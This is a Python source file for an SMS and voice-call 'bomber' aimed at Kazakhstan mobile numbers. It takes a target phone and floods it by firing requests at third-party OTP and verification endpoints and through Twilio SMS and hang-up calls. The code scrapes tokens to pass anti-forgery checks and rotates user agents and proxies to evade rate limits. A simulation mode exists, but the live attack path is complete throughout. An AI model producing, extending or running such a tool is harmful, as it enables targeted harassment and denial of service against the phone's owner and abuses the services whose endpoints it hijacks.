BACKEND      = "verify"          # "verify" | "twilio" | "both"
THREADS      = 6
DELAY_MIN_MS = 200
DELAY_MAX_MS = 1400
CONFIG_PATH  = "endpoints.json"

# ============================================================

import json
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from urllib.parse import quote_plus

try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError:
    print("[ERR] pip install requests", file=sys.stderr)
    sys.exit(1)


# ============================================================
#  KAZAKHSTAN PHONE NORMALIZER
# ============================================================

KZ_MOBILE_PREFIXES = {
    "700", "701", "702", "703", "704",
    "705", "706", "707", "708",
    "747",
    "750", "751",
    "760", "761", "762", "763",
    "771",
    "775", "776", "777", "778",
}


def _make_display(digits: str) -> str:
    """7788328909 -> '+7 (778) 832-89-09'"""
    return f"+7 ({digits[0:3]}) {digits[3:6]}-{digits[6:8]}-{digits[8:10]}"


def _make_display_space(digits: str) -> str:
    """7788328909 -> '+7 (778) 832 89 09'"""
    return f"+7 ({digits[0:3]}) {digits[3:6]} {digits[6:8]} {digits[8:10]}"


def normalize_kz_phone(raw: str, force: bool = False) -> dict:
    digits = re.sub(r"\D", "", raw)
    if digits.startswith("8") and len(digits) == 11:
        digits = digits[1:]
    elif digits.startswith("7") and len(digits) == 11:
        digits = digits[1:]

    if len(digits) != 10:
        return {"e164": None, "e164_enc": None, "raw": None, "local8": None,
                "national": None, "display": None, "display_enc": None,
                "display_space": None, "display_space_enc": None,
                "valid": False, "prefix": None,
                "error": f"expected 10 national digits, got {len(digits)}"}

    prefix = digits[:3]
    valid = prefix in KZ_MOBILE_PREFIXES
    display = _make_display(digits)
    display_space = _make_display_space(digits)
    e164 = f"+7{digits}"

    return {
        "e164":              e164,
        "e164_enc":          quote_plus(e164),
        "raw":               f"7{digits}",
        "local8":            f"8{digits}",
        "national":          digits,
        "display":           display,
        "display_enc":       quote_plus(display),
        "display_space":     display_space,
        "display_space_enc": quote_plus(display_space),
        "prefix":            prefix,
        "valid":             valid,
        "error":             None if valid else f"prefix {prefix} not in KZ mobile set",
    }


def substitute_phone(template: str, forms: dict) -> str:
    out = template
    out = out.replace("{phone_display_space_enc}", forms["display_space_enc"] or "")
    out = out.replace("{phone_display_space}",     forms["display_space"]     or "")
    out = out.replace("{phone_display_enc}",       forms["display_enc"]       or "")
    out = out.replace("{phone_display}",           forms["display"]           or "")
    out = out.replace("{phone_e164_enc}",          forms["e164_enc"]          or "")
    out = out.replace("{phone_national}",          forms["national"]          or "")
    out = out.replace("{phone_raw}",               forms["raw"]               or "")
    out = out.replace("{phone_8}",                 forms["local8"]            or "")
    out = out.replace("{phone_prefix}",            forms["prefix"]            or "")
    out = out.replace("{phone}",                   forms["e164"]              or "")
    return out


# ============================================================
#  CONFIG
# ============================================================

@dataclass
class Endpoint:
    name: str
    method: str
    url: str
    channel: str = "sms"
    content_type: str = "application/json"
    body: str = ""
    headers: dict = field(default_factory=dict)
    pre_request: dict = None
    enabled: bool = True


@dataclass
class Config:
    target_phone: str
    endpoints: list = field(default_factory=list)
    threads: int = 6
    delay_min_ms: int = 200
    delay_max_ms: int = 1400
    timeout_sec: int = 10
    simulation: bool = True
    user_agents: list = field(default_factory=list)
    proxies: list = field(default_factory=list)
    twilio_sid: str = ""
    twilio_token: str = ""
    twilio_from: str = ""
    twilio_sms_count: int = 0
    twilio_call_count: int = 0
    twilio_message: str = ""


DEFAULT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148",
]


def load_config(path: str) -> Config:
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)

    cfg = Config(target_phone=data.get("target_phone", ""))
    cfg.threads      = data.get("threads", 6)
    cfg.delay_min_ms = data.get("delay_min_ms", 200)
    cfg.delay_max_ms = data.get("delay_max_ms", 1400)
    cfg.timeout_sec  = data.get("timeout_sec", 10)
    cfg.simulation   = data.get("simulation_mode", True)
    cfg.user_agents  = data.get("user_agents") or DEFAULT_UAS
    cfg.proxies      = data.get("proxies", [])

    t = data.get("twilio", {})
    cfg.twilio_sid        = t.get("account_sid", "")
    cfg.twilio_token      = t.get("auth_token", "")
    cfg.twilio_from       = t.get("from_number", "")
    cfg.twilio_sms_count  = t.get("sms_count", 0)
    cfg.twilio_call_count = t.get("call_count", 0)
    cfg.twilio_message    = t.get("message", "yo")

    for e in data.get("endpoints", []):
        if not e.get("enabled", True):
            continue
        cfg.endpoints.append(Endpoint(
            name=e["name"],
            method=e.get("method", "POST"),
            url=e["url"],
            channel=e.get("channel", "sms"),
            content_type=e.get("content_type", "application/json"),
            body=e.get("body", ""),
            headers=e.get("headers", {}),
            pre_request=e.get("pre_request"),
        ))

    return cfg


# ============================================================
#  BACKENDS
# ============================================================

class VerifyBackend:
    def __init__(self, cfg: Config, forms: dict):
        self.cfg = cfg
        self.forms = forms
        self.sess = requests.Session()

    def _run_pre_request(self, ep: Endpoint) -> tuple:
        pre = ep.pre_request
        sess = requests.Session()

        pre_url = substitute_phone(pre.get("url", ""), self.forms)
        pre_method = pre.get("method", "GET").upper()
        pre_headers = {
            "User-Agent": random.choice(self.cfg.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7",
        }
        for k, v in pre.get("headers", {}).items():
            pre_headers[k] = v

        try:
            if pre_method == "POST":
                r = sess.post(pre_url, headers=pre_headers,
                              timeout=self.cfg.timeout_sec)
            else:
                r = sess.get(pre_url, headers=pre_headers,
                             timeout=self.cfg.timeout_sec)
        except requests.RequestException as e:
            return sess, f"[PRE_ERR:{e}]", {}

        extract = pre.get("extract", {})
        pattern = extract.get("pattern", "")
        if not pattern:
            return sess, "", extract
        try:
            m = re.search(pattern, r.text)
            token = m.group(1) if m else ""
        except re.error as e:
            return sess, f"[REGEX_ERR:{e}]", extract
        return sess, token, extract

    def fire(self, ep: Endpoint) -> dict:
        url  = substitute_phone(ep.url,  self.forms)
        body = substitute_phone(ep.body, self.forms)
        result = {"name": ep.name, "channel": ep.channel,
                  "ok": False, "status": None, "snippet": ""}

        extra_header = None

        if self.cfg.simulation:
            if ep.pre_request:
                pre_url = substitute_phone(ep.pre_request.get("url", ""), self.forms)
                print(f"[SIM][{ep.channel}] {ep.name}  PRE "
                      f"{ep.pre_request.get('method','GET').upper()} {pre_url}")
            display_body = body.replace("\r", "").replace("\n", "\\n")[:200]
            print(f"[SIM][{ep.channel}] {ep.name}  {ep.method} {url}"
                  + (f"  body={display_body}" if display_body else ""))
            time.sleep(random.uniform(0.03, 0.12))
            result.update(ok=True, status=200, snippet="simulated")
            return result

        if ep.pre_request:
            sess, token, extract_spec = self._run_pre_request(ep)
            into = extract_spec.get("into")
            if into:
                body = body.replace(into, token)
                url  = url.replace(into, token)
            hdr = extract_spec.get("header")
            if hdr:
                extra_header = (hdr, token)
            shown = token[:16] + "..." if len(token) > 16 else repr(token)
            where = []
            if into: where.append(f"body:{into}")
            if hdr:  where.append(f"header:{hdr}")
            print(f"[PRE][{ep.channel}] {ep.name}  token={shown}  -> {','.join(where)}")
        else:
            sess = self.sess

        headers = dict(ep.headers)
        headers.setdefault("User-Agent", random.choice(self.cfg.user_agents))
        if ep.content_type:
            headers.setdefault("Content-Type", ep.content_type)
        if extra_header:
            headers[extra_header[0]] = extra_header[1]

        headers = {k: substitute_phone(v, self.forms) for k, v in headers.items()}

        proxy = None
        if self.cfg.proxies:
            p = random.choice(self.cfg.proxies)
            proxy = {"http": p, "https": p}

        try:
            if ep.method.upper() == "POST":
                r = sess.post(url, data=body, headers=headers,
                              timeout=self.cfg.timeout_sec, proxies=proxy,
                              allow_redirects=False)
            elif ep.method.upper() == "PUT":
                r = sess.put(url, data=body, headers=headers,
                             timeout=self.cfg.timeout_sec, proxies=proxy)
            else:
                r = sess.get(url, headers=headers,
                             timeout=self.cfg.timeout_sec, proxies=proxy)

            result["status"]  = r.status_code
            result["ok"]      = 200 <= r.status_code < 400
            loc = r.headers.get("Location", "")
            result["snippet"] = (loc or r.text[:120]).replace("\n", " ")
            print(f"[LIVE][{ep.channel}] {ep.name}  HTTP {r.status_code}  "
                  f"{'OK' if result['ok'] else 'FAIL'}  {result['snippet']}")
        except requests.RequestException as e:
            result["snippet"] = str(e)[:120]
            print(f"[LIVE][{ep.channel}] {ep.name}  EXC  {result['snippet']}")

        return result


class TwilioBackend:
    BASE = "https://api.twilio.com/2010-04-01/Accounts"

    def __init__(self, cfg: Config, forms: dict):
        self.cfg = cfg
        self.forms = forms
        self.auth = HTTPBasicAuth(cfg.twilio_sid, cfg.twilio_token)

    def send_sms(self, msg: str) -> dict:
        url = f"{self.BASE}/{self.cfg.twilio_sid}/Messages.json"
        return self._post(url, {
            "To": self.forms["e164"],
            "From": self.cfg.twilio_from,
            "Body": msg,
        }, "SMS")

    def trigger_call(self) -> dict:
        url = f"{self.BASE}/{self.cfg.twilio_sid}/Calls.json"
        return self._post(url, {
            "To": self.forms["e164"],
            "From": self.cfg.twilio_from,
            "Url": "http://twimlets.com/hangup",
        }, "CALL")

    def _post(self, url, payload, tag):
        if self.cfg.simulation:
            print(f"[SIM][{tag}] -> {self.forms['e164']}  {payload}")
            time.sleep(random.uniform(0.05, 0.15))
            return {"ok": True, "status": 200}
        try:
            r = requests.post(url, data=payload, auth=self.auth,
                              timeout=self.cfg.timeout_sec)
            ok = 200 <= r.status_code < 300
            print(f"[TWILIO][{tag}] HTTP {r.status_code}  "
                  f"{'OK' if ok else 'FAIL'}  {r.text[:100]}")
            return {"ok": ok, "status": r.status_code}
        except requests.RequestException as e:
            print(f"[TWILIO][{tag}] EXC  {e}")
            return {"ok": False, "status": None}


# ============================================================
#  SCHEDULER
# ============================================================

class Bomber:
    def __init__(self, cfg: Config, forms: dict):
        self.cfg = cfg
        self.forms = forms
        self.lock = threading.Lock()
        self.ok = 0
        self.fail = 0

    def _tick(self, ok: bool):
        with self.lock:
            if ok: self.ok += 1
            else:  self.fail += 1

    def run_verify(self):
        backend = VerifyBackend(self.cfg, self.forms)

        def job(ep):
            r = backend.fire(ep)
            self._tick(r["ok"])
            time.sleep(random.uniform(self.cfg.delay_min_ms,
                                      self.cfg.delay_max_ms) / 1000.0)

        with ThreadPoolExecutor(max_workers=self.cfg.threads) as ex:
            futs = [ex.submit(job, ep) for ep in self.cfg.endpoints]
            for _ in as_completed(futs):
                pass

    def run_twilio(self, do_sms: bool = True, do_calls: bool = True):
        backend = TwilioBackend(self.cfg, self.forms)
        jobs = []
        if do_sms:
            for i in range(self.cfg.twilio_sms_count):
                jobs.append(("sms", i))
        if do_calls:
            for i in range(self.cfg.twilio_call_count):
                jobs.append(("call", i))
        random.shuffle(jobs)

        def job(kind, idx):
            if kind == "sms":
                r = backend.send_sms(f"{self.cfg.twilio_message} [{idx+1}]")
            else:
                r = backend.trigger_call()
            self._tick(r["ok"])
            time.sleep(random.uniform(self.cfg.delay_min_ms,
                                      self.cfg.delay_max_ms) / 1000.0)

        with ThreadPoolExecutor(max_workers=self.cfg.threads) as ex:
            futs = [ex.submit(job, k, i) for (k, i) in jobs]
            for _ in as_completed(futs):
                pass


# ============================================================
#  PROGRAMMATIC ENTRY POINT (for server.py)
# ============================================================

def run_bomber(cfg: Config, forms: dict, want_channels: set,
               event_cb=None, stop_flag=None) -> dict:
    cfg.endpoints = [e for e in cfg.endpoints
                     if e.channel.lower() in want_channels]

    do_sms   = "sms" in want_channels
    do_calls = bool(want_channels & {"voice", "call"})

    events = []
    counter = {"ok": 0, "fail": 0, "seq": 0}
    lock = threading.Lock()

    def emit(ev):
        with lock:
            counter["seq"] += 1
            ev["seq"] = counter["seq"]
            events.append(ev)
        if event_cb:
            event_cb(ev)

    def tick(ok):
        with lock:
            if ok: counter["ok"] += 1
            else:  counter["fail"] += 1

    if BACKEND in ("verify", "both") and cfg.endpoints:
        backend = VerifyBackend(cfg, forms)

        def job(ep):
            if stop_flag and stop_flag.is_set():
                return
            r = backend.fire(ep)
            tick(r["ok"])
            emit({
                "phone":   forms["e164"],
                "channel": r["channel"],
                "name":    r["name"],
                "status":  "sent" if r["ok"] else "failed",
                "http":    r["status"],
                "error":   None if r["ok"] else (r["snippet"] or "")[:120],
            })
            time.sleep(random.uniform(cfg.delay_min_ms,
                                      cfg.delay_max_ms) / 1000.0)

        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futs = [ex.submit(job, ep) for ep in cfg.endpoints]
            for _ in as_completed(futs):
                pass

    if BACKEND in ("twilio", "both"):
        tw = TwilioBackend(cfg, forms)
        jobs = []
        if do_sms:
            jobs += [("sms", i) for i in range(cfg.twilio_sms_count)]
        if do_calls:
            jobs += [("call", i) for i in range(cfg.twilio_call_count)]
        random.shuffle(jobs)

        def tjob(kind, idx):
            if stop_flag and stop_flag.is_set():
                return
            if kind == "sms":
                r = tw.send_sms(f"{cfg.twilio_message} [{idx+1}]")
                ch = "sms"
            else:
                r = tw.trigger_call()
                ch = "call"
            tick(r["ok"])
            emit({
                "phone":   forms["e164"],
                "channel": ch,
                "name":    f"twilio_{kind}_{idx+1}",
                "status":  "sent" if r["ok"] else "failed",
                "http":    r["status"],
                "error":   None if r["ok"] else "twilio_error",
            })
            time.sleep(random.uniform(cfg.delay_min_ms,
                                      cfg.delay_max_ms) / 1000.0)

        with ThreadPoolExecutor(max_workers=cfg.threads) as ex:
            futs = [ex.submit(tjob, k, i) for (k, i) in jobs]
            for _ in as_completed(futs):
                pass

    return {"ok": counter["ok"], "fail": counter["fail"], "events": events}


# ============================================================
#  MAIN
# ============================================================

def main():
    print("=== KZ BOMBER — ENI ===")
    print("Enter target phone (any form: 8700..., 8 700..., +77..., 700...).")
    print("Blank line aborts. Prefix with '!' to force a non-standard number.\n")

    forms = None
    while True:
        try:
            raw = input("Phone: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[abort]")
            sys.exit(0)
        if not raw:
            print("[abort]")
            sys.exit(0)
        force = raw.startswith("!")
        probe = raw[1:] if force else raw
        forms = normalize_kz_phone(probe, force=force)
        if forms["e164"]:
            if forms["valid"] or force:
                break
            print(f"  [bad] {forms['error']}")
            print(f"  [retry, or prefix with '!' to force]\n")
        else:
            print(f"  [bad] {forms['error']}\n")

    print()
    print(f"Canonical:      {forms['e164']}   prefix {forms['prefix']}")
    print(f"Local 8:        {forms['local8']}")
    print(f"National:       {forms['national']}")
    print(f"Display:        {forms['display']}")
    print(f"Display space:  {forms['display_space']}")

    chan_raw = input(
        "Channels [s]ms / [v]oice / [b]oth (default both): "
    ).strip().lower()
    if chan_raw.startswith("s"):
        want = {"sms"}; label = "SMS only"
    elif chan_raw.startswith("v"):
        want = {"voice", "call"}; label = "Voice only"
    else:
        want = {"sms", "voice", "call"}; label = "SMS + Voice"

    mode_raw = input("Mode [s]im / [l]ive (default sim): ").strip().lower()
    simulation = not mode_raw.startswith("l")

    try:
        cfg = load_config(CONFIG_PATH)
    except FileNotFoundError:
        if BACKEND in ("verify", "both"):
            print(f"[ERR] config not found: {CONFIG_PATH}", file=sys.stderr)
            sys.exit(1)
        cfg = Config(target_phone=forms["e164"])
    except json.JSONDecodeError as e:
        print(f"[ERR] config JSON invalid: {e}", file=sys.stderr)
        sys.exit(1)

    total_before = len(cfg.endpoints)
    cfg.endpoints = [e for e in cfg.endpoints if e.channel.lower() in want]
    filtered_out = total_before - len(cfg.endpoints)

    cfg.target_phone = forms["e164"]
    cfg.simulation   = simulation
    cfg.threads      = THREADS
    cfg.delay_min_ms = DELAY_MIN_MS
    cfg.delay_max_ms = DELAY_MAX_MS

    do_sms   = "sms" in want
    do_calls = bool(want & {"voice", "call"})

    print()
    print(f"Backend:   {BACKEND}")
    print(f"Channels:  {label}")
    print(f"Mode:      {'LIVE' if not cfg.simulation else 'SIMULATION'}")
    print(f"Threads:   {cfg.threads}")
    if BACKEND in ("verify", "both"):
        print(f"Endpoints: {len(cfg.endpoints)}"
              + (f"  ({filtered_out} filtered out)" if filtered_out else ""))
        for ep in cfg.endpoints:
            tag = " +pre" if ep.pre_request else ""
            print(f"  - {ep.name}  [{ep.channel}]{tag}")
    if BACKEND in ("twilio", "both"):
        print(f"Twilio SMS: {cfg.twilio_sms_count if do_sms else 'off'}"
              f"  Calls: {cfg.twilio_call_count if do_calls else 'off'}")
    print()

    bomber = Bomber(cfg, forms)
    t0 = time.time()

    if BACKEND == "verify":
        bomber.run_verify()
    elif BACKEND == "twilio":
        bomber.run_twilio(do_sms, do_calls)
    elif BACKEND == "both":
        bomber.run_verify()
        bomber.run_twilio(do_sms, do_calls)
    else:
        print(f"[ERR] unknown BACKEND: {BACKEND}", file=sys.stderr)
        sys.exit(1)

    dt = time.time() - t0
    print(f"\n=== DONE in {dt:.1f}s ===")
    print(f"OK:     {bomber.ok}")
    print(f"Failed: {bomber.fail}")


if __name__ == "__main__":
    main()
